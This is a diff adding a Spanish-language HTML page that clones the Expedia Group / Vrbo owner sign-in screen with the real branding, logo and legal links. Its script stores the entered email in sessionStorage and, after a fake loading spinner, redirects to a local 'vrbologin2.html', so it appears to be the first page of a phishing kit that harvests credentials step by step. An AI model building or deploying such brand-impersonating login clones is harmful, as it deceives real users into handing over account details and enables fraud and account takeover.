@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Inicia sesión o crea una cuenta de Expedia Group</title>
+  
+  <link rel="icon" type="image/png" href="pestaña.png" />
+
+  <style>
+    @font-face {
+      font-family: "Centra No2";
+      font-weight: 400;
+      src: url("https://a.travel-assets.com/egds/fonts/CentraNo2/CentraNo2-Book.woff2") format("woff2");
+    }
+    @font-face {
+      font-family: "Centra No2";
+      font-weight: 500;
+      src: url("https://a.travel-assets.com/egds/fonts/CentraNo2/CentraNo2-Medium.woff2") format("woff2");
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: "Centra No2", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      background: #ffffff; color: #191e3b; min-height: 100vh; display: flex; flex-direction: column;
+      justify-content: flex-start; -webkit-font-smoothing: antialiased;
+    }
+    .navbar-container {
+      background: #ffffff; height: 64px; width: 100%; display: flex; justify-content: center;
+      align-items: center; border-bottom: 1px solid #dfe0e4; flex-shrink: 0;
+    }
+    .uitk-header-brand-logo { display: flex; align-items: center; text-decoration: none; }
+    .uitk-header-brand-logo img { height: 36px; display: block; }
+    .page-wrapper { display: flex; justify-content: center; width: 100%; padding: 32px 16px; background: #ffffff; }
+    .card { width: 100%; max-width: 440px; display: flex; flex-direction: column; gap: 24px; }
+    .banner {
+      background: #ebf5ff; border: 1px solid #dfe0e4; border-radius: 16px;
+      display: flex; align-items: center; gap: 16px; padding: 12px;
+    }
+    .shield-circle {
+      flex-shrink: 0; width: 48px; height: 48px; background-color: #aed1f3; 
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+    }
+    .shield-circle svg { width: 24px; height: 24px; fill: #191e3b; }
+    .banner-text { flex: 1; display: flex; flex-direction: column; }
+    .banner-text h6 { font-size: 14px; font-weight: 500; line-height: 1.125rem; color: #191e3b; margin-bottom: 2px; }
+    .banner-text p { font-size: 14px; font-weight: 400; line-height: 1.125rem; color: #191e3b; margin-bottom: 8px; }
+    .banner-text a { color: #1668e3; text-decoration: underline; font-size: 14px; font-weight: 400; }
+    .heading-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: -8px; }
+    h1 { font-size: 28px; font-weight: 500; color: #191e3b; line-height: 2.5rem; }
+    .subtitle { font-size: 14px; color: #191e3b; line-height: 1.125rem; font-weight: 400; }
+    .field-wrapper { position: relative; height: 52px; width: 100%; } 
+    .floating-input {
+      width: 100%; height: 100%; padding: 22px 12px 6px 12px;
+      border: 1px solid #818494; border-radius: 8px; font-family: inherit; font-size: 16px;
+      color: #191e3b; background: #fff; outline: none; appearance: none;
+      transition: border-color 0.15s, box-shadow 0.15s;
+    }
+    .floating-input:focus { border-color: #1668e3; box-shadow: inset 0 0 0 1px #1668e3; }
+    .floating-input.error { border-color: #a7183c; box-shadow: inset 0 0 0 1px #a7183c; }
+    .floating-label {
+      position: absolute; left: 12px; top: 50%; transform: translateY(-50%); font-size: 16px; color: #676a7d;
+      pointer-events: none; transition: 0.15s;
+    }
+    .floating-input:focus + .floating-label, .floating-input:not(:placeholder-shown) + .floating-label {
+      top: 14px; font-size: 12px; transform: translateY(-50%);
+    }
+    .error-msg { display: none; align-items: center; gap: 4px; margin-top: 4px; font-size: 12px; color: #a7183c; }
+    .error-msg.show { display: flex; }
+    .error-msg svg { width: 16px; height: 16px; fill: #a7183c; flex-shrink: 0; }
+    .btn-wrap { display: flex; flex-direction: column; gap: 12px; }
+    .btn {
+      display: flex; align-items: center; justify-content: center; width: 100%; height: 48px; border-radius: 9999px;
+      font-family: inherit; font-size: 16px; font-weight: 500; cursor: pointer; border: 1px solid transparent;
+      transition: background 0.15s, color 0.15s, opacity 0.15s;
+    }
+    .btn-primary { background-color: #1668e3; color: #ffffff; }
+    .btn-primary:disabled { opacity: 0.36; cursor: not-allowed; }
+    .btn-secondary { background-color: #ffffff; color: #1668e3; border-color: #dfe0e4; }
+    .legal { font-size: 12px; color: #191e3b; line-height: 1.125rem; text-align: left; margin: 0 16px; }
+    .legal a { color: #1668e3; text-decoration: underline; }
+    @keyframes inner-circle { 0% { transform: rotate(0deg); } to { transform: rotate(1turn); } }
+    .uitk-loader-page {
+      aspect-ratio: 1/1; background-color: #fff; box-shadow: 0 6px 36px rgba(12, 14, 28, 0.12); 
+      inline-size: 48px; inset-block-end: 0; inset-inline-start: 50%; opacity: 0; padding: 6px; 
+      position: fixed; transform: translate(-50%, 100%); transition: transform .06s, opacity 0.12s;
+      z-index: 1000; border-radius: 50%;
+    }
+    .uitk-loader-page.is-visible { opacity: 1; transform: translate(-50%, -40px); }
+    .uitk-loader::before {
+      animation: inner-circle .8s linear infinite; aspect-ratio: 1/1; border-bottom-color: #1668e3;
+      border-top-color: rgba(22,104,227,.28); border-left-color: rgba(22,104,227,.28); border-right-color: rgba(22,104,227,.28);
+      border-radius: 50%; border-style: solid; border-width: 6px; content: ""; display: block; inline-size: 36px; 
+    }
+  </style>
+</head>
+<body>
+<div class="navbar-container">
+  <a class="uitk-header-brand-logo" href="#">
+    <img src="https://www.vrbo.com/_dms/header/logo.svg" alt="Expedia Group">
+  </a>
+</div>
+<div class="page-wrapper">
+  <div class="card">
+    <div class="banner">
+      <div class="shield-circle">
+        <svg viewBox="0 0 24 24"><path d="m11.19 1.36-7 3.11A2 2 0 0 0 3 6.3V11c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V6.3a2 2 0 0 0-1.19-1.83l-7-3.11a1.99 1.99 0 0 0-1.62 0zM12 11.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+      </div>
+      <div class="banner-text">
+        <h6>Inicio de sesión fácil y seguro</h6>
+        <p>Hemos simplificado el inicio de sesión para mejorar la seguridad y para que sea más sencillo acceder a los sitios web de Expedia&nbsp;Group.</p>
+        <a href="https://accounts.expediagroup.com/partner/info/sign-in-and-account-management">Obtener más información</a>
+      </div>
+    </div>
+    <div class="heading-group">
+      <h1>Iniciar sesión</h1>
+      <p class="subtitle">Introduce tu dirección de correo electrónico o inicia sesión en el Espacio Propietario de Vrbo</p>
+    </div>
+    <form id="login-form">
+      <div class="field-wrapper">
+        <input type="email" id="email" class="floating-input" placeholder=" " autocomplete="email" />
+        <label for="email" class="floating-label">Dirección de correo</label>
+      </div>
+      <div class="error-msg" id="error-msg">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        <span>Introduce una dirección de correo válida.</span>
+      </div>
+    </form>
+    <div class="btn-wrap">
+      <button type="submit" form="login-form" class="btn btn-primary" id="btn-continuar" disabled>Continuar</button>
+      <button type="button" class="btn btn-secondary">Volver</button>
+    </div>
+    <p class="legal">
+      Al continuar, has leído y aceptas los <a href="https://www.vrbo.com/lp/b/host-terms-of-service">términos y condiciones</a>, así como la <a href="https://www.vrbo.com/es-es/legal/privacy">política de privacidad</a>
+    </p>
+  </div>
+</div>
+<span class="uitk-loader uitk-loader-page" id="page-loader"></span>
+<script>
+  const emailInput = document.getElementById('email');
+  const btn = document.getElementById('btn-continuar');
+  const loader = document.getElementById('page-loader');
+  emailInput.addEventListener('input', () => { btn.disabled = !emailInput.value.includes('@'); });
+  // Reemplaza el submit del login-form
+document.getElementById('login-form').addEventListener('submit', (e) => {
+  e.preventDefault();
+  btn.disabled = true;
+  loader.classList.add('is-visible');
+  sessionStorage.setItem('vrbo_correo', emailInput.value); // ← correo
+  setTimeout(() => { window.location.href = 'vrbologin2.html'; }, 3000);
+});
+</script>
+</body>
+</html>
